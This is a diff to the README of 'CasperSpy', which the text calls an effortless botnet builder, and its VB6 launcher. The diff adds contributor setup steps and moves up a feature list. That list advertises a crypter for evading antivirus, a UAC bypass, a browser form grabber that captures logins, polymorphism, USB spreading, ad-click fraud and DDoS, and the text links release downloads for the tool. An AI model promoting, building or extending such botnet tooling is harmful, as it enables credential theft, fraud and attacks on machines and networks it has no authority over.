@@ -15,6 +15,22 @@ CasperLauncher is distributed in the hope that it will be useful.
 
 ## [Download New Release here](https://github.com/dhanumurti/casperspy/releases)
 
+## How to modify Source Code?
+
+So you're interested in giving us a hand? That's awesome! We've put together some guidelines that should help
+you get started quickly and easily.
+
+### Preparation
+
+You need Visual Basic 6. Just it!
+
+### Register Activex Component
+
+[Visit here](https://groups.google.com/forum/#!topic/casperspy/0OeHEJytpa0).
+
+### Open CasperLauncher.vbp using Visual Basic
+
+
 ***
 
 # CasperSpy - Effortless Botnet Builder 
@@ -36,6 +52,18 @@ You can create Bot Instantly using thist tool with Easy Configuration.
 Then make your bot undetectable in our Crypter.
 
 ## [Download New Release here](https://github.com/dhanumurti/casperspy/releases)
+
+## Feature 
+
+* Ads Clicking.
+* Anti UAC : Bypass (User Account Control) Prevention
+* Crypter : Will protect your bot from Antivirus detection.
+* Form Grabber : It will grab any form data through browser such as: form login, registration etc.
+* Pollymorphic.
+* USB Spread
+* DDOS.
+* Plugin : Create your own plugin (additional plugin on progress)
+
 
 ***
 
@@ -66,16 +94,6 @@ This is the content of **Start.bat** script:
 `pause`
 `start casperlauncher.exe`
 
-## Feature 
-
-* Ads Clicking.
-* Anti UAC : Bypass (User Account Control) Prevention
-* Crypter : Will protect your bot from Antivirus detection.
-* Form Grabber : It will grab any form data through browser such as: form login, registration etc.
-* Pollymorphic.
-* USB Spread
-* DDOS.
-* Plugin : Create your own plugin (additional plugin on progress)
 
 ## Minimal system requirements
 
@@ -85,10 +103,6 @@ This is the content of **Start.bat** script:
  
 
 ***
-
-## Getting Involved
-
-Want to report a bug, request a feature, contribute or translate CasperSpy or CasperLauncher? Check out our in-depth guide to [Contributing to Casper](https://groups.google.com/forum/#!forum/casperspy). We need all the help we can get! You can also join in with our [community](https://groups.google.com/forum/#!forum/casperspy) to keep up-to-date and meet other CasperFriends.
 
 ## DISCLAIMER EULA
 
